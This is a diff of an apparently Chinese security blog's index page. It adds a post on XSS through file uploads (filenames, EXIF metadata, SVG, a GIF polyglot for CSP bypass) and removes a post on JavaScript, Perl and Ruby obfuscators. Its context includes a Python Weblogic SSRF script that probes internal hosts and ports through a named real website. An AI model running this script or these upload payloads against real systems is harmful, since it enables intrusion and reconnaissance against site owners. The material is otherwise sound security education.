@@ -296,6 +296,167 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/XSS姿势——文件上传XSS/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/XSS姿势——文件上传XSS/" itemprop="url">
+                  XSS姿势——文件上传XSS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:20:58+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/XSS姿势——文件上传XSS/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/XSS姿势——文件上传XSS/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/XSS姿势——文件上传XSS/" class="leancloud_visitors" data-flag-title="XSS姿势——文件上传XSS">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr>
+<p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p>
+<h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr>
+<p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p>
+<h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p>
+<p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p>
+<p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="external">W3Schools</a>练习这种XSS 。</p>
+<h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p>
+<p>例如：</p>
+<p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p>
+<h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p>
+<p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p>
+<h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p>
+<p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p>
+<p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p>
+<p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p>
+<p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p>
+<p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p>
+<h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr>
+<p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p>
+<p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="external">here</a></p>
+<p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">http://brutelogic.com.br/blog/</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/PNG文件中的LSB隐写/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1687,155 +1848,6 @@
           
             <p>Weblogic_SSRF的一个利用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip_str)</span>:</span></div><div class="line"><span class="comment">#元组</span></div><div class="line">ports = (<span class="string">'21'</span>,<span class="string">'22'</span>,<span class="string">'23'</span>,<span class="string">'53'</span>,<span class="string">'80'</span>,<span class="string">'135'</span>,<span class="string">'139'</span>,<span class="string">'443'</span>,<span class="string">'445'</span>,<span class="string">'1080'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'3389'</span>,<span class="string">'4899'</span>,<span class="string">'8080'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>,)</div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="comment"># %d 是整形通配符,%s是字符串通配符</span></div><div class="line">exp_url = <span class="string">"http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>%(ip_str,port)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"></div><div class="line">response = requests.get(exp_url, timeout=<span class="number">1</span>, verify=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span> <span class="keyword">in</span> response.content:</div><div class="line"></div><div class="line"><span class="keyword">print</span> ip_str+<span class="string">':'</span> + port + <span class="string">' --open'</span></div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception, e:</div><div class="line"></div><div class="line"><span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ip</span><span class="params">(ip_prefix)</span>:</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">190</span>,<span class="number">200</span>):</div><div class="line"></div><div class="line">scan(<span class="string">'%s.%s'</span>%(ip_prefix,i))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">commandargs = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">args = <span class="string">""</span>.join(commandargs)<span class="comment">#将列表数据以‘’中的字符链接</span></div><div class="line"></div><div class="line">ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">find_ip(ip_prefix)</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/CTF中那些有趣的混淆/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/CTF中那些有趣的混淆/" itemprop="url">
-                  CTF中那些有趣的混淆
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:40:24+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/CTF中那些有趣的混淆/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/CTF中那些有趣的混淆/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/CTF中那些有趣的混淆/" class="leancloud_visitors" data-flag-title="CTF中那些有趣的混淆">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>​    ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。</p>
-<h4 id="ppencode-Perl"><a href="#ppencode-Perl" class="headerlink" title="ppencode-Perl"></a>ppencode-Perl</h4><p>台湾的Perl达人<a href="http://pugs.blogs.com/" target="_blank" rel="external">唐鳳</a>在<a href="http://yapcasia.org/2010/" target="_blank" rel="external">YAPC</a>曾经介绍过<a href="http://www.slideshare.net/autang/ppencode" target="_blank" rel="external">ppencode</a>，它可以把Perl代码转换成只有英文字母的字符串。</p>
-<p>下面是转换示例：</p>
-<p>Demo的地址：<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">http://namazu.org/~takesako/ppencode/demo.html</a>。</p>
-<h4 id="rrencode-Ruby"><a href="#rrencode-Ruby" class="headerlink" title="rrencode-Ruby"></a>rrencode-Ruby</h4><p>rrencode可以把ruby代码全部转换成符号。</p>
-<p>下面是转换示例：</p>
-<p>项目地址：<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html</a>。</p>
-<h4 id="jjencode-aaencode-Javascript"><a href="#jjencode-aaencode-Javascript" class="headerlink" title="jjencode/aaencode-Javascript"></a>jjencode/aaencode-Javascript</h4><p><a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="external">jjencode</a>和aaencode都是<a href="http://twitter.com/#!/hasegawayosuke" target="_blank" rel="external">Yosuke HASEGAWA</a>的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">http://utf-8.jp/public/20090710/jjencode.pps</a>。</p>
-<p>后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下：</p>
-<p>Demo的地址是：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a>，转换的代码并不复杂，可以在源代码里看到。</p>
 
           
         
